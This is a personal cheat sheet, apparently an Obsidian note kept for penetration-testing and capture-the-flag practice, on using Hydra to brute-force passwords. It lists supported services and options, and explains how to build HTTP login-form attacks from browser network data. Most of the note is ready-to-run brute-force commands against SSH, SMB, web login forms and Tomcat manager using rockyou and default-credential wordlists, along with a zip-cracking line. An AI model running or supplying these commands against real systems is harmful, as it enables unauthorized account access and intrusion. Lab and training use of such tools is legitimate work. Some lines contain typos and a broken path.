---
tags: 🔻 🔻/🃏 Passwords hydra bruteforce
aliases: Hacking Notes
---

# Hydra

### Basic Hydra useage

hydra *Username options* *Password options* *Options* *IP Address* *Protocol* -V -f
Can brute force passwords on ssh, ftp, smb, mysql, postgres, telnet

Supported Services  
adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http\[s\]-{head|get|post} http\[s\]-{get|post}-form http-proxy http-proxy-urlenum icq imap\[s\] irc ldap2\[s\] ldap3\[-{cram|digest}md5\]\[s\] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3\[s\] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp\[s\] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet\[s\] vmauthd vnc xmpp

**Options**  
-l  Single Username  
-L Username list  
-p Password  
-P Password list  
-t Limit concurrent connections  
-V Verbose output  
-f Stop on correct login  
-s Port
	
	
### Hydra use for HTTPS
	
Brute forcing authentication using Hyrda on a web service requires more research than any of the other services. We will need three main things from the website. The login page, request body, and the error message.

**Website Login Page**  
Let’s start with the main login page we can see the Username and Password fields.
	
**Inspect Elements **
Now that we can see the website we need to inspect the page. Right click on the page and select “inspect element” from the drop-down menu.

**Website Headers**  
Now that we are in the “inspect elements” section we need to get into the headers area.  
Select the Network tab and then attempt to login (This will fail to log in). After the login fails click on the POST Method and then click on “Edit and Resent.”
	
**Information Gathering**  
In this view, we need to focus on four things. Hostname/IP, Login Page, Request Body, and the error message.
	
	
**Command Build**

With all the information that we have collected now let’s build the hydra command.  
Change the *Login page* this value has to start with “/” backspace.  
Change *Request body* with the format from the page. We do need to modify the username and password. Replace the failed username with ^USER^ and the failed password with ^PASS^. This change will allow hydra to substitute the values.  
Change the *Error Message* with the failed login error message.  
Change the *IP Address* with either an IP address or hostname.  
Change the *User* with either username or username list.  
Change the *Password* with either a password or password list.

Layout of command: hydra -L *USER* -P *Password* *IP Address* http-post-form “*Login Page*:*Request Body*:*Error Message*”

# hydra
#hydra 

hydra -l root -P /usr/share/wordlists/rockyou.txt  x.x.x.x  
  
hydra -l boris -P /usr/share/wordlists/fasttrack.txt -f x.x.x.x  
  
hydra -l natalya -P /usr/share/wordlists/fasttrack.txt -f x.x.x.x  
  
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt x.x.x.x  
  
hydra -l root -P wordlist.txt x.x.x.x  
hydra -L userlist.txt -P bestx.x.x.x  
  
hydra -P wordlist.txt -v x.x.x.x    
  
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb http-post-form "/department/login.php:username=^USER^&password=^PASS^&Login=Login:Invalid Password!"  
  
#### ssh 
hydra -f -V -t 1 -C /usr/share/SecLists-5c9217fe8e930c41d128aacdc68cbce7ece96e4f/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 22 $IP ssh  
  
#### Hydra for login bypass:  

hydra *http:targetaddress* http-form-post "/TARGETPATH/TARGETPAGE.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt  
hrydra -C /seclist/tomcat-betterdefaultpasslist http-get://ip:port/manager/html  
hydra -C /root/attacker-framework/SecLists/Passwords/Default-Cr edentials/tomcat-betterdefaultpasslist.txt http-get://x.x.x.x  
  
  
  
fcrackzip -D -p ../../wordlists/rockyou.txt -u backup.zip   
  
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt nineveh.htb https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc\_login=true&Login=Login:Incorrect password."  
  
#smb  
hydra to crack smb password -> hydra -l qui -P /usr/share/wordlists/fasttrack.txt -e nsr smb://ip